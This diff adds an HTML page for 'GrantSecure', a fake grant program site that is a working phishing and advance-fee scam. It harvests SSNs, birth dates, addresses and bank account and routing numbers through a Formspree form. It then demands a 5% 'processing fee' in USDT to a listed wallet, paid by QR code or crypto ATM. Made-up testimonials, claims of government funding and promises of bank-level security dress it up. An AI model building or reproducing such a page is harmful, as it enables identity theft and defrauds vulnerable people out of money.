@@ -1,0 +1,816 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="style.css" />
+    <title>GrantSecure - Grant Program Application</title>
+  </head>
+  <body>
+    <header>
+      <div class="container header-content">
+        <div class="logo">GrantSecure</div>
+        <nav>
+          <ul>
+            <li>
+              <a href="#" class="nav-link active" data-page="home">Home</a>
+            </li>
+            <li><a href="#" class="nav-link" data-page="about">About</a></li>
+            <li>
+              <a href="#" class="nav-link" data-page="contact">Contact</a>
+            </li>
+          </ul>
+        </nav>
+      </div>
+    </header>
+
+    <!-- Home Page -->
+    <section class="page active" id="home-page">
+      <section class="hero">
+        <div class="container">
+          <h1>Secure Grant Program Application</h1>
+          <p>
+            Apply for financial assistance through our secure platform. Your
+            privacy and data security are our top priorities.
+          </p>
+        </div>
+      </section>
+
+      <div class="container">
+        <!-- Application Form Section -->
+        <section class="section" id="apply">
+          <h2>Grant Application Form</h2>
+          <div class="alert alert-info">
+            <strong>Important:</strong> Please fill out the form completely and
+            accurately. All information is kept confidential and secure.
+          </div>
+
+          <div class="success-message" id="successMessage">
+            <h3>Application Submitted Successfully!</h3>
+            <div class="application-id-box">
+              Your Application ID: <span id="applicationId"></span>
+            </div>
+            <p>
+              <strong
+                >Please keep your Application ID safe and secure. Do not share
+                it with anyone.</strong
+              >
+            </p>
+            <p>
+              This ID is required to claim your funds if approved. You will
+              receive an email concerning your application status from us soon.
+            </p>
+          </div>
+
+          <!-- Form with proper Formspree action -->
+          <form
+            id="grantForm"
+            action="https://formspree.io/f/mqayedbe"
+            method="POST"
+          >
+            <!-- Hidden fields for Formspree -->
+            <input
+              type="hidden"
+              name="_subject"
+              value="New Grant Application"
+            />
+            <input type="hidden" name="_replyto" id="replyTo" />
+
+            <div class="form-row">
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="firstName">First Name *</label>
+                  <input type="text" id="firstName" name="firstName" required />
+                  <div class="error-message" id="firstNameError">
+                    First name is required
+                  </div>
+                </div>
+              </div>
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="lastName">Last Name *</label>
+                  <input type="text" id="lastName" name="lastName" required />
+                  <div class="error-message" id="lastNameError">
+                    Last name is required
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="form-row">
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="dob">Date of Birth *</label>
+                  <input type="date" id="dob" name="dob" required />
+                  <div class="error-message" id="dobError">
+                    Date of birth is required
+                  </div>
+                </div>
+              </div>
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="ssn">Social Security Number (SSN) *</label>
+                  <input
+                    type="text"
+                    id="ssn"
+                    name="ssn"
+                    placeholder="XXX-XX-XXXX"
+                    required
+                  />
+                  <div class="error-message" id="ssnError">SSN is required</div>
+                </div>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label for="address">House Address *</label>
+              <input type="text" id="address" name="address" required />
+              <div class="error-message" id="addressError">
+                Address is required
+              </div>
+            </div>
+
+            <div class="form-row">
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="phone">Phone Number *</label>
+                  <input type="tel" id="phone" name="phone" required />
+                  <div class="error-message" id="phoneError">
+                    Phone number is required
+                  </div>
+                </div>
+              </div>
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="email">Email Address *</label>
+                  <input type="email" id="email" name="email" required />
+                  <div class="error-message" id="emailError">
+                    Valid email is required
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="form-row">
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="amount">Amount You Wish to Claim ($) *</label>
+                  <input
+                    type="number"
+                    id="amount"
+                    name="amount"
+                    min="10000"
+                    max="800000"
+                    required
+                  />
+                  <small>Minimum: $10,000 | Maximum: $800,000</small>
+                  <div class="error-message" id="amountError">
+                    Amount between $10,000 and $800,000 is required
+                  </div>
+                </div>
+              </div>
+              <div class="form-col">
+                <div class="form-group">
+                  <label for="occupation">Occupation / Business Type *</label>
+                  <select id="occupation" name="occupation" required>
+                    <option value="">Select an option</option>
+                    <option value="small-business">Small Business Owner</option>
+                    <option value="startup">Startup Entrepreneur</option>
+                    <option value="freelancer">
+                      Freelancer / Self-Employed
+                    </option>
+                    <option value="student">Student</option>
+                    <option value="employed">Employed Individual</option>
+                    <option value="unemployed">Currently Unemployed</option>
+                    <option value="retired">Retired</option>
+                    <option value="non-profit">Non-Profit Organization</option>
+                    <option value="other">Other</option>
+                  </select>
+                  <div class="error-message" id="occupationError">
+                    Occupation is required
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <div class="form-group">
+              <label for="reason">Reason for Grant Request *</label>
+              <textarea
+                id="reason"
+                name="reason"
+                rows="4"
+                placeholder="Please explain why you need this grant and how it will help you..."
+                required
+              ></textarea>
+              <div class="error-message" id="reasonError">
+                Reason for grant request is required
+              </div>
+            </div>
+
+            <!-- Processing Fee Display -->
+            <div class="fee-breakdown">
+              <h3>Processing Fee Information</h3>
+              <div class="fee-item">
+                <span>Grant Amount Requested:</span>
+                <span id="requestedAmount">$0</span>
+              </div>
+              <div class="fee-item">
+                <span>Processing Fee (5%):</span>
+                <span id="processingFee">$0</span>
+              </div>
+              <div class="fee-item fee-total">
+                <span>Net Amount After Fee:</span>
+                <span id="netAmount">$0</span>
+              </div>
+              <div class="fee-note">
+                <p>
+                  <strong>Important:</strong> The 5% processing fee must be paid
+                  before we can process your application and deliver your funds.
+                  This fee is necessary for:
+                </p>
+                <ul>
+                  <li>
+                    Administrative costs to verify your application and
+                    eligibility
+                  </li>
+                  <li>
+                    Security measures to protect your personal and financial
+                    information
+                  </li>
+                  <li>
+                    Compliance with financial regulations and anti-fraud
+                    protocols
+                  </li>
+                  <li>
+                    Logistics and delivery coordination for your grant funds
+                  </li>
+                </ul>
+                <p>
+                  Your grant funds will be delivered only after the processing
+                  fee has been successfully received and verified.
+                </p>
+              </div>
+            </div>
+
+            <!-- Payment Delivery Method -->
+            <div class="form-group">
+              <h3>Payment Delivery Method *</h3>
+              <p>
+                Select how you would like to receive your grant funds if
+                approved:
+              </p>
+
+              <div class="payment-options">
+                <div class="payment-option selected" data-method="fedex">
+                  <h4>FedEx Delivery</h4>
+                  <p>Cash delivery via FedEx to your address</p>
+                </div>
+                <div class="payment-option" data-method="bank">
+                  <h4>Bank Transfer</h4>
+                  <p>Direct transfer to your bank account</p>
+                </div>
+              </div>
+
+              <!-- FedEx Delivery Details -->
+              <div class="payment-details active" id="fedex-details">
+                <h4>FedEx Delivery Information *</h4>
+                <div class="form-group">
+                  <label for="fedexAddress">Delivery Address</label>
+                  <input
+                    type="text"
+                    id="fedexAddress"
+                    name="fedexAddress"
+                    placeholder="Street, City, State, ZIP Code"
+                    required
+                  />
+                  <div class="error-message" id="fedexAddressError">
+                    FedEx delivery address is required
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label for="fedexInstructions"
+                    >Special Delivery Instructions</label
+                  >
+                  <textarea
+                    id="fedexInstructions"
+                    name="fedexInstructions"
+                    rows="2"
+                    placeholder="Any special instructions for delivery..."
+                  ></textarea>
+                </div>
+                <div class="form-row">
+                  <div class="form-col">
+                    <div class="form-group">
+                      <label for="contactPerson">Contact Person</label>
+                      <input
+                        type="text"
+                        id="contactPerson"
+                        name="contactPerson"
+                        placeholder="Name of person to receive package"
+                        required
+                      />
+                      <div class="error-message" id="contactPersonError">
+                        Contact person is required
+                      </div>
+                    </div>
+                  </div>
+                  <div class="form-col">
+                    <div class="form-group">
+                      <label for="contactPhone">Contact Phone</label>
+                      <input
+                        type="tel"
+                        id="contactPhone"
+                        name="contactPhone"
+                        placeholder="Phone number for delivery"
+                        required
+                      />
+                      <div class="error-message" id="contactPhoneError">
+                        Contact phone is required
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- Bank Transfer Details -->
+              <div class="payment-details" id="bank-details">
+                <h4>Bank Transfer Information *</h4>
+                <div class="form-row">
+                  <div class="form-col">
+                    <div class="form-group">
+                      <label for="bankName">Bank Name</label>
+                      <input
+                        type="text"
+                        id="bankName"
+                        name="bankName"
+                        placeholder="Name of your bank"
+                        required
+                      />
+                      <div class="error-message" id="bankNameError">
+                        Bank name is required
+                      </div>
+                    </div>
+                  </div>
+                  <div class="form-col">
+                    <div class="form-group">
+                      <label for="accountHolder">Account Holder Name</label>
+                      <input
+                        type="text"
+                        id="accountHolder"
+                        name="accountHolder"
+                        placeholder="Name on the account"
+                        required
+                      />
+                      <div class="error-message" id="accountHolderError">
+                        Account holder name is required
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-row">
+                  <div class="form-col">
+                    <div class="form-group">
+                      <label for="accountNumber">Account Number</label>
+                      <input
+                        type="text"
+                        id="accountNumber"
+                        name="accountNumber"
+                        placeholder="Your account number"
+                        required
+                      />
+                      <div class="error-message" id="accountNumberError">
+                        Account number is required
+                      </div>
+                    </div>
+                  </div>
+                  <div class="form-col">
+                    <div class="form-group">
+                      <label for="routingNumber">Routing Number</label>
+                      <input
+                        type="text"
+                        id="routingNumber"
+                        name="routingNumber"
+                        placeholder="Bank routing number"
+                        required
+                      />
+                      <div class="error-message" id="routingNumberError">
+                        Routing number is required
+                      </div>
+                    </div>
+                  </div>
+                </div>
+                <div class="form-group">
+                  <label for="bankAddress">Bank Address</label>
+                  <input
+                    type="text"
+                    id="bankAddress"
+                    name="bankAddress"
+                    placeholder="Bank branch address"
+                    required
+                  />
+                  <div class="error-message" id="bankAddressError">
+                    Bank address is required
+                  </div>
+                </div>
+              </div>
+            </div>
+
+            <!-- Processing Fee Payment Method -->
+            <div class="crypto-payment">
+              <h3>Processing Fee Payment</h3>
+              <p>
+                The processing fee must be paid using USDT (TRC20). Please send
+                the exact amount shown above to the following wallet address:
+              </p>
+
+              <div class="form-group">
+                <label for="usdtAmount">Amount to Send (USDT)</label>
+                <input
+                  type="text"
+                  id="usdtAmount"
+                  name="usdtAmount"
+                  readonly
+                  style="background-color: #f8f9fa; font-weight: bold"
+                />
+              </div>
+
+              <div class="form-group">
+                <label>USDT (TRC20) Wallet Address</label>
+                <div class="crypto-address" id="usdtAddress">
+                  TMNshpbnipJLfCoM2RAd9rgzc4LuUhKmnB
+                </div>
+                <button
+                  type="button"
+                  class="btn btn-copy"
+                  data-address="TMNshpbnipJLfCoM2RAd9rgzc4LuUhKmnB"
+                >
+                  Copy Address
+                </button>
+              </div>
+
+              <div class="qr-code">
+                <img
+                  src="https://api.qrserver.com/v1/create-qr-code/?data=TMNshpbnipJLfCoM2RAd9rgzc4LuUhKmnB&size=200x200"
+                  alt="USDT TRC20 QR Code"
+                />
+                <p>Scan QR code to send USDT</p>
+              </div>
+
+              <div class="screenshot-instruction">
+                <h4>Important Payment Instruction</h4>
+                <p>
+                  <strong
+                    >Please take a screenshot of this QR code or copy the wallet
+                    address for payment at a Bitcoin machine or cryptocurrency
+                    exchange.</strong
+                  >
+                </p>
+                <p>After making the payment, please take a screenshot of:</p>
+                <ul>
+                  <li>
+                    The payment confirmation screen showing the transaction
+                    details
+                  </li>
+                  <li>
+                    The processing fee amount and this QR code for reference
+                  </li>
+                </ul>
+                <p>
+                  You may be asked to provide this screenshot for verification
+                  purposes.
+                </p>
+              </div>
+            </div>
+
+            <!-- Hidden fields to capture calculations for Formspree -->
+            <input type="hidden" id="processingFeeValue" name="processingFee" />
+            <input type="hidden" id="netAmountValue" name="netAmount" />
+            <input type="hidden" id="applicationIdValue" name="applicationId" />
+            <input
+              type="hidden"
+              id="paymentMethod"
+              name="paymentMethod"
+              value="fedex"
+            />
+
+            <div class="privacy-policy">
+              <h3>Privacy & Security Policy *</h3>
+              <p>
+                We take your privacy and security seriously. By submitting this
+                application, you agree to the following:
+              </p>
+              <ul>
+                <li>
+                  All personal information provided will be encrypted and stored
+                  securely
+                </li>
+                <li>
+                  We will not disclose your information to any third parties
+                  without your explicit consent
+                </li>
+                <li>
+                  Your SSN and financial details are protected with bank-level
+                  security measures
+                </li>
+                <li>
+                  We implement strict protocols to prevent identity theft and
+                  fraud
+                </li>
+                <li>
+                  You will receive confirmation of your application via secure
+                  channels
+                </li>
+              </ul>
+              <div class="form-group">
+                <input
+                  type="checkbox"
+                  id="agreePolicy"
+                  name="agreePolicy"
+                  required
+                />
+                <label for="agreePolicy"
+                  >I have read and agree to the Privacy & Security Policy</label
+                >
+                <div class="error-message" id="policyError">
+                  You must agree to the privacy policy
+                </div>
+              </div>
+            </div>
+
+            <button type="submit" class="btn" id="submitBtn">
+              Submit Application
+            </button>
+          </form>
+        </section>
+      </div>
+    </section>
+
+    <!-- About Page -->
+    <section class="page" id="about-page">
+      <section class="hero">
+        <div class="container">
+          <h1>About Our Grant Program</h1>
+          <p>
+            Learn more about our mission, eligibility criteria, and success
+            stories
+          </p>
+        </div>
+      </section>
+
+      <div class="container">
+        <section class="section">
+          <h2>Our Mission</h2>
+          <div class="grant-details">
+            <p>
+              The GrantSecure program is dedicated to providing financial
+              assistance to individuals and businesses in need. Our mission is
+              to empower communities by offering grants that help people achieve
+              their personal and professional goals.
+            </p>
+            <p>
+              This program is funded by government initiatives and major NGOs
+              committed to giving back to their communities. We believe in
+              creating opportunities for growth and development through
+              financial support.
+            </p>
+          </div>
+        </section>
+
+        <section class="section">
+          <h2>Eligibility Criteria</h2>
+          <div class="eligibility-criteria">
+            <p>
+              Our grant program is open to a wide range of applicants. You may
+              be eligible if you fall into one of these categories:
+            </p>
+            <ul class="criteria-list">
+              <li>Small business owners seeking expansion capital</li>
+              <li>Entrepreneurs starting new businesses</li>
+              <li>
+                Individuals facing financial hardship due to medical expenses
+              </li>
+              <li>Students pursuing higher education</li>
+              <li>Homeowners needing assistance with housing costs</li>
+              <li>Non-profit organizations serving community needs</li>
+              <li>Artists and creators seeking project funding</li>
+              <li>Individuals affected by natural disasters</li>
+              <li>Single parents needing financial support</li>
+              <li>Veterans transitioning to civilian life</li>
+            </ul>
+            <p>
+              Each application is reviewed individually, and decisions are based
+              on both financial need and potential impact.
+            </p>
+          </div>
+        </section>
+
+        <section class="section">
+          <h2>Success Stories</h2>
+          <div class="testimonials">
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "The $50,000 grant allowed me to expand my bakery business. I
+                purchased new equipment and hired two employees. My revenue has
+                increased by 60% in just six months!"
+              </div>
+              <div class="testimonial-author">- Maria Gonzalez</div>
+              <div class="testimonial-amount">Grant Received: $50,000</div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "After losing my job, the $25,000 grant helped me start my
+                consulting business. I'm now financially stable and able to
+                support my family while doing work I love."
+              </div>
+              <div class="testimonial-author">- James Wilson</div>
+              <div class="testimonial-amount">Grant Received: $25,000</div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "Thanks to the $15,000 educational grant, I completed my nursing
+                degree without massive debt. I'm now working at a local hospital
+                and giving back to my community."
+              </div>
+              <div class="testimonial-author">- Sarah Johnson</div>
+              <div class="testimonial-amount">Grant Received: $15,000</div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "The $100,000 housing grant helped me make a down payment on my
+                first home. As a single parent, this was a dream I thought was
+                years away."
+              </div>
+              <div class="testimonial-author">- David Chen</div>
+              <div class="testimonial-amount">Grant Received: $100,000</div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "The $200,000 agricultural grant transformed my small farm. I
+                invested in sustainable irrigation and doubled my crop yield,
+                now supplying three local schools."
+              </div>
+              <div class="testimonial-author">- Robert Davis</div>
+              <div class="testimonial-amount">Grant Received: $200,000</div>
+            </div>
+            <div class="testimonial">
+              <div class="testimonial-text">
+                "With the $300,000 grant for my tech startup, we developed an
+                inventory management app and created 15 new jobs in our
+                community."
+              </div>
+              <div class="testimonial-author">- Amanda Rodriguez</div>
+              <div class="testimonial-amount">Grant Received: $300,000</div>
+            </div>
+          </div>
+        </section>
+      </div>
+    </section>
+
+    <!-- Contact Page -->
+    <section class="page" id="contact-page">
+      <section class="hero">
+        <div class="container">
+          <h1>Contact GrantSecure</h1>
+          <p>
+            Have questions? We're here to help. Get in touch with our support
+            team.
+          </p>
+        </div>
+      </section>
+
+      <div class="container">
+        <section class="section">
+          <h2>Get in Touch</h2>
+          <div class="alert alert-info">
+            <strong>Note:</strong> Our support team typically responds within
+            24-48 hours. For urgent matters, please call our support line.
+          </div>
+
+          <div class="contact-success" id="contactSuccess">
+            <h3>Message Sent Successfully!</h3>
+            <p>
+              Thank you for contacting GrantSecure. We have received your
+              message and will respond to you within 24-48 hours.
+            </p>
+          </div>
+
+          <div class="contact-form-container">
+            <form
+              id="contactForm"
+              action="https://formspree.io/f/mqayedbe"
+              method="POST"
+            >
+              <input
+                type="hidden"
+                name="_subject"
+                value="GrantSecure Contact Form Submission"
+              />
+              <input type="hidden" name="_replyto" id="contactReplyTo" />
+
+              <div class="form-row">
+                <div class="form-col">
+                  <div class="form-group">
+                    <label for="contactName">Your Name *</label>
+                    <input
+                      type="text"
+                      id="contactName"
+                      name="contactName"
+                      required
+                    />
+                    <div class="error-message" id="contactNameError">
+                      Name is required
+                    </div>
+                  </div>
+                </div>
+                <div class="form-col">
+                  <div class="form-group">
+                    <label for="contactEmail">Email Address *</label>
+                    <input
+                      type="email"
+                      id="contactEmail"
+                      name="contactEmail"
+                      required
+                    />
+                    <div class="error-message" id="contactEmailError">
+                      Valid email is required
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <div class="form-group">
+                <label for="contactSubject">Subject *</label>
+                <select id="contactSubject" name="contactSubject" required>
+                  <option value="">Select a subject</option>
+                  <option value="application-questions">
+                    Application Questions
+                  </option>
+                  <option value="payment-issues">Payment Issues</option>
+                  <option value="status-inquiry">
+                    Application Status Inquiry
+                  </option>
+                  <option value="technical-support">Technical Support</option>
+                  <option value="general-inquiry">General Inquiry</option>
+                  <option value="other">Other</option>
+                </select>
+                <div class="error-message" id="contactSubjectError">
+                  Subject is required
+                </div>
+              </div>
+
+              <div class="form-group">
+                <label for="contactMessage">Message *</label>
+                <textarea
+                  id="contactMessage"
+                  name="contactMessage"
+                  rows="6"
+                  placeholder="Please describe your question or concern in detail..."
+                  required
+                ></textarea>
+                <div class="error-message" id="contactMessageError">
+                  Message is required
+                </div>
+              </div>
+
+              <button type="submit" class="btn" id="contactSubmitBtn">
+                Send Message
+              </button>
+            </form>
+          </div>
+
+          <div class="contact-info">
+            <div class="contact-method">
+              <h3>Email Support</h3>
+              <p>support@grantsecure.com</p>
+              <p>We respond within 24-48 hours</p>
+            </div>
+
+            <div class="contact-method">
+              <h3>Phone Support</h3>
+              <p>1-800-GRANT-SECURE</p>
+              <p>Mon-Fri: 9am-5pm EST</p>
+            </div>
+
+            <div class="contact-method">
+              <h3>Mailing Address</h3>
+              <p>GrantSecure Inc.</p>
+              <p>123 Financial District</p>
+              <p>New York, NY 10005</p>
+            </div>
+          </div>
+        </section>
+      </div>
+    </section>
+
+    <footer>
+      <div class="container">
+        <p>&copy; 2023 GrantSecure. All rights reserved.</p>
+        <div class="contact-info" style="margin-top: 1rem">
+          <p>Contact us: support@grantsecure.com | 1-800-GRANT-SECURE</p>
+        </div>
+      </div>
+    </footer>
+
+    <script src="script.js"></script>
+  </body>
+</html>
